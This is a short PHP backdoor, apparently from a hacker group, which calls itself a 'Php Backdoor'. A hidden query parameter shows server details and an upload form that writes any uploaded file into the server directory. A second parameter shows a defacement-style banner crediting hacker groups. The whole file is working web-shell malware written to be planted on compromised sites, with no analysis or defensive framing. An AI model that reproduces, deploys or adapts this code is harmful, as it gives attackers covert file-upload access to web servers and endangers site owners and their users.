<?php
if($_GET['ev']=="oo"){
echo '<title>Lastc0de@outlook.com | Php Backdoor</title><style>
body{background-color:#000000;color:#ffffff;}</style><font style="Arial"><font color="green"><center><b><br><br>'.php_uname().'</b><br><font style="Consolas"><font color="green"><center><b><br><br>Directory: '.getcwd().' <br></b><br><form action=""method="post" enctype="multipart/form-data" name="uploader" ></center><br><center><input type="file" name="file" size="50"><input name="_zx" type="submit"  value="Upload"/></form></center>';if($_POST['_zx'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {echo '<center><b><br><br><b>File Uploaded :<a href="'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b><br><br></center>'; }else {echo '<b>'.$_FILES['file']['name'].' Not Uploaded.</b>';}}}
if(isset($_GET["zzz"])){
   echo "<title>Evoo</title><center><div id=q>lastc0de@Outlook.com<br><font size=2>Thx To CodersLeet - AgencyCaFc - IndoXploit <style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}";
   exit;
}
?>

